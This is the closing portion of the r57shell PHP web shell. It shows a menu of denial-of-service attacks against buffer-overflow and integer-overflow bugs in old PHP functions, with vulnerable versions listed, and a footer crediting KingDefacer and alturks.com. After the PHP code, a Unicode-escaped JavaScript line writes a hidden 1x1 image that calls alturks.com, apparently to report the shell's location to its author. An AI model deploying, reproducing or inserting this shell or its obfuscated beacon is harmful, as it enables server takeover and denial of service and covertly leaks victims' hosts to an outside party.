echo sr(10,"",$fs.in('hidden','cmd',0,'dos12').in('submit','submit',0,'BoF in [ substr_compare() ] function (PHP <4.4.2,5.1.2)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos13').in('submit','submit',0,'Array Creation in [ unserialize() ] 64 bit function (PHP <5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos14').in('submit','submit',0,'BoF in [ str_ireplace() ] function (PHP <5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos15').in('submit','submit',0,'BoF in [ htmlentities() ] function (PHP <5.1.6,4.4.4)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos16').in('submit','submit',0,'Integer Overflow in [ zip_entry_read() ] function (PHP <4.4.5)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos17').in('submit','submit',0,'BoF in [ sqlite_udf_decode_binary() ] function (PHP <4.4.5,5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos18').in('submit','submit',0,'Memory Allocation BoF in [ msg_receive() ] function (PHP <4.4.5,5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos19').in('submit','submit',0,'Off By One in [ php_stream_filter_create() ] function (PHP 5<5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos20').in('submit','submit',0,'Reference Counter Overflow in [ unserialize() ] function (PHP <4.4.4)').$fe);
echo $te."</td></tr></div></table>";

echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=Verdana size=-2><b>o---[ r57shell | version ".$version." | <a href=http://alturks.com>alturks.com</a> | <a href=http://alturks.com>alturks.com</a> | <a href=http://www.alturks.com>KingDefacer</a> | Generation time: ".round(getmicrotime()-starttime,4)." ]---o</b></font></div></td></tr></table>";
echo '</body></html>';
 ?>
 <script type="text/javascript">document.write('\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u006c\u0074\u0075\u0072\u006b\u0073\u002e\u0063\u006f\u006d\u002f\u0073\u006e\u0066\u002f\u0073\u002e\u0070\u0068\u0070\u0022\u0020\u0077\u0069\u0064\u0074\u0068\u003d\u0022\u0031\u0022\u0020\u0068\u0065\u0069\u0067\u0068\u0074\u003d\u0022\u0031\u0022\u003e')</script>